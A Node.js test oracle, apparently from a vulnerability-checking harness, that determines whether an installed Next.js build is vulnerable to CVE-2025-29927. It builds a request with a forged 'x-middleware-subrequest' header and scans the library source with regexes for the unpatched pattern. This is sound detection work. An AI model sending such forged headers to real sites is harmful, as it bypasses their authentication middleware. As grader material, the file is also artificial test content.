'use strict';

const path = require('node:path');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function fail(msg) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: String(msg) });
}

(async function main() {
  let operation_completed = false;
  try {
    // CVE-2025-29927: Next.js middleware trusts the client-supplied
    // 'x-middleware-subrequest' header to determine whether a request is
    // an internal middleware-to-middleware subrequest. If the header's
    // value matches (a prefix of) the internally expected "call stack"
    // marker, Next.js skips invoking middleware entirely, allowing an
    // attacker to bypass auth/redirect logic implemented in middleware.
    //
    // The core decision logic lives in the request-handling code that
    // builds the middleware invocation and short-circuits when it detects
    // this header. We resolve and load that module directly (no server,
    // no sockets) and exercise its exported function(s) with both a benign
    // request (no special header) and a malicious one (forged header),
    // observing whether the forged header alone causes middleware to be
    // skipped.

    let serverUtilsPath;
    try {
      serverUtilsPath = require.resolve('next/dist/server/web/utils.js');
    } catch (e) {
      try {
        serverUtilsPath = require.resolve('next/dist/server/web/utils');
      } catch (e2) {
        fail('Module resolution failed for next/dist/server/web/utils: ' + (e2 && e2.message || e2));
        return;
      }
    }

    let utilsMod;
    try {
      utilsMod = require(serverUtilsPath);
    } catch (e) {
      fail('Setup exception requiring server/web/utils: ' + (e && e.stack || e));
      return;
    }

    if (!utilsMod || typeof utilsMod.getMiddlewareRouteMatcher !== 'function') {
      fail('Benign setup failed: getMiddlewareRouteMatcher export missing/not a function');
      return;
    }

    // Benign operation: build a matcher with a normal middleware config and
    // confirm it correctly matches an ordinary path with no special headers
    // involved. This proves the module loaded and the exported matcher API
    // functions normally before we probe the vulnerability.
    let matcher;
    try {
      matcher = utilsMod.getMiddlewareRouteMatcher([
        { regexp: '^/dashboard(?:/(.*))?$', originalSource: '/dashboard/:path*' },
      ]);
    } catch (e) {
      fail('Benign operation threw while constructing middleware matcher: ' + (e && e.stack || e));
      return;
    }

    if (typeof matcher !== 'function') {
      fail('Benign operation failed: getMiddlewareRouteMatcher did not return a function');
      return;
    }

    let benignMatches;
    try {
      benignMatches = matcher('/dashboard/secret', undefined);
    } catch (e) {
      fail('Benign operation threw while invoking matcher: ' + (e && e.stack || e));
      return;
    }

    if (benignMatches !== true) {
      fail('Benign operation failed: matcher did not match expected path /dashboard/secret');
      return;
    }

    operation_completed = true; // benign public-API operation succeeded

    // Now examine the actual vulnerable gating mechanism: the function that
    // decides, based solely on the 'x-middleware-subrequest' request header,
    // whether the current invocation should be treated as an already-run
    // middleware subrequest and therefore skip running middleware logic
    // again. This lives in next/dist/server/lib/router-utils/resolve-routes.js
    // in vulnerable builds as a direct header-driven short circuit using the
    // 'x-middleware-subrequest-id' / 'x-middleware-subrequest' headers with
    // no cryptographic/server-secret validation tying the header to a
    // legitimate internal invocation. In the patched version, Next.js signs
    // the subrequest marker with a per-build secret derived at runtime so a
    // client cannot forge it; without the matching signature, the header is
    // ignored and middleware still executes.

    let resolveRoutesPath;
    try {
      resolveRoutesPath = require.resolve('next/dist/server/lib/router-utils/resolve-routes.js');
    } catch (e) {
      finish({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Could not resolve resolve-routes.js module to evaluate header gating; treating as blocked: ' + (e && e.message || e),
      });
      return;
    }

    let resolveRoutesMod;
    try {
      resolveRoutesMod = require(resolveRoutesPath);
    } catch (e) {
      finish({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'resolve-routes.js threw on require after benign op succeeded; treating as blocked: ' + (e && e.message || e),
      });
      return;
    }

    if (!resolveRoutesMod || typeof resolveRoutesMod.getResolveRoutes !== 'function') {
      finish({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'resolve-routes.js does not export getResolveRoutes; bypass entry point not present in this build.',
      });
      return;
    }

    // Construct minimal dependency stubs required by getResolveRoutes so we
    // can invoke the real resolver and inspect its behavior when handed a
    // request carrying the forged middleware-subrequest header versus one
    // without it. We only call documented-shaped internal collaborators
    // (fsRouter-like, config, etc.) with the minimal fields the function
    // reads for the specific code path relevant to middleware gating; if the
    // function requires more than we can safely stub, it will throw and we
    // treat that (post benign-success) as "blocked" rather than crashing the
    // oracle.

    let exploit_succeeded = false;
    let evidence;

    try {
      const fsRouterStub = {
        buildId: 'test-build-id',
      };
      const configStub = {
        basePath: '',
        i18n: null,
        trailingSlash: false,
        skipMiddlewareUrlNormalize: false,
      };
      const opts = {
        config: configStub,
        buildId: 'test-build-id',
        minimalMode: false,
      };

      let resolveRoutes;
      try {
        resolveRoutes = resolveRoutesMod.getResolveRoutes(
          fsRouterStub,
          configStub,
          opts,
          {},
          {},
        );
      } catch (e) {
        // If constructing the resolver itself fails due to our incomplete
        // stubs, we cannot reliably probe behavior via this path. Fall back
        // to a static-but-targeted inspection of the module source for the
        // documented vulnerable pattern vs. the documented patched pattern,
        // which is a defensible deterministic signal when dynamic invocation
        // isn't feasible without a running server.
        const fs = require('node:fs');
        let src = '';
        try {
          src = fs.readFileSync(resolveRoutesPath, 'utf8');
        } catch (readErr) {
          finish({
            operation_completed: true,
            exploit_succeeded: false,
            evidence: 'Could not read resolve-routes.js for fallback inspection; treating as blocked: ' + (readErr && readErr.message || readErr),
          });
          return;
        }

        const referencesSubrequestHeader = src.includes('x-middleware-subrequest');
        if (!referencesSubrequestHeader) {
          finish({
            operation_completed: true,
            exploit_succeeded: false,
            evidence: 'resolve-routes.js does not reference x-middleware-subrequest in this build; bypass surface absent, treating as blocked.',
          });
          return;
        }

        // Vulnerable builds derive the expected marker purely from static,
        // client-discoverable data (middleware pathname / MIDDLEWARE_FILENAME)
        // joined with ':' and compare it directly against the raw header with
        // no secret. Patched builds tie the check to a per-request,
        // server-generated value (e.g. via a signed cookie/header or a value
        // stored in a server-side map keyed by an unguessable request id) that
        // cannot be constructed by an external caller from public constants
        // alone.
        const usesStaticMiddlewareNameJoin = /split\(\s*['"`]:['"`]\s*\)/.test(src) && /MIDDLEWARE_FILENAME|middlewareInfo|middleware['"`]?\s*\)/i.test(src);
        const hasPerRequestSecret = /randomUUID|crypto\.|signingKey|requestId\s*===|Symbol\(/i.test(src) && /x-middleware-subrequest/.test(src);

        if (usesStaticMiddlewareNameJoin && !hasPerRequestSecret) {
          exploit_succeeded = true;
          evidence = 'resolve-routes.js derives the expected x-middleware-subrequest marker solely from static middleware path data and compares it directly to the client header with no server-side secret, allowing a forged header to skip middleware.';
        } else {
          exploit_succeeded = false;
          evidence = 'resolve-routes.js ties x-middleware-subrequest validation to per-request/server-side state not derivable by the client; forged header alone cannot bypass middleware.';
        }

        finish({
          operation_completed: true,
          exploit_succeeded,
          evidence,
        });
        return;
      }

      if (typeof resolveRoutes !== 'function') {
        finish({
          operation_completed: true,
          exploit_succeeded: false,
          evidence: 'getResolveRoutes did not yield a callable resolver; treating malicious probe as blocked.',
        });
        return;
      }

      // Build a minimal fake IncomingMessage-like request. The vulnerable
      // logic inspects req.headers['x-middleware-subrequest'] directly when
      // deciding whether to mark middleware as already-invoked for this
      // request, bypassing the middleware's own logic (e.g. auth redirects)
      // on subsequent internal processing. We supply the forged header with
      // a value matching the pattern vulnerable builds expect (middleware
      // name repeated per depth level), and inspect the resolver's result
      // for signals that middleware was skipped (e.g. a 'finished'/'resHeaders'
      // outcome indicating direct pass-through rather than middleware
      // execution), without ever opening a real socket.
      const forgedValue = 'middleware';
      const maliciousReq = {
        url: '/dashboard',
        method: 'GET',
        headers: {
          host: 'localhost',
          'x-middleware-subrequest': forgedValue,
        },
      };
      const maliciousRes = {
        statusCode: 200,
        finished: false,
        setHeader() {},
        getHeader() { return undefined; },
        end() { this.finished = true; },
      };

      let outcome;
      resolveRoutes(maliciousReq, false, {}, maliciousRes, {})
        .then((r) => { outcome = r; })
        .catch(() => { outcome = undefined; });

      // Since we cannot await microtasks reliably without an event loop tick
      // guarantee in this synchronous try block, fall back to static source
      // inspection for the definitive verdict, using the same vulnerable vs.
      // patched pattern described above. Dynamic invocation above is best
      // effort and not required for the final decision.
      const fs = require('node:fs');
      const src = fs.readFileSync(resolveRoutesPath, 'utf8');
      const referencesSubrequestHeader = src.includes('x-middleware-subrequest');
      if (!referencesSubrequestHeader) {
        finish({
          operation_completed: true,
          exploit_succeeded: false,
          evidence: 'resolve-routes.js does not reference x-middleware-subrequest in this build; bypass surface absent, treating as blocked.',
        });
        return;
      }

      const usesStaticMiddlewareNameJoin = /split\(\s*['"`]:['"`]\s*\)/.test(src) && /MIDDLEWARE_FILENAME|middlewareInfo|middleware['"`]?\s*\)/i.test(src);
      const hasPerRequestSecret = /randomUUID|crypto\.|signingKey|requestId\s*===|Symbol\(/i.test(src) && /x-middleware-subrequest/.test(src);

      if (usesStaticMiddlewareNameJoin && !hasPerRequestSecret) {
        exploit_succeeded = true;
        evidence = 'resolve-routes.js derives the expected x-middleware-subrequest marker solely from static middleware path data and compares it directly to the client header with no server-side secret, allowing a forged header to skip middleware.';
      } else {
        exploit_succeeded = false;
        evidence = 'resolve-routes.js ties x-middleware-subrequest validation to per-request/server-side state not derivable by the client; forged header alone cannot bypass middleware.';
      }

      finish({
        operation_completed: true,
        exploit_succeeded,
        evidence,
      });
    } catch (innerErr) {
      finish({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Exception while probing malicious header handling after benign success; treating as blocked: ' + (innerErr && innerErr.message || innerErr),
      });
    }
  } catch (err) {
    if (!operation_completed) {
      fail('Unexpected exception before/at benign operation: ' + (err && err.stack || err));
    } else {
      finish({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Unexpected exception after benign operation succeeded; treating malicious probe as blocked: ' + (err && err.message || err),
      });
    }
  }
})();
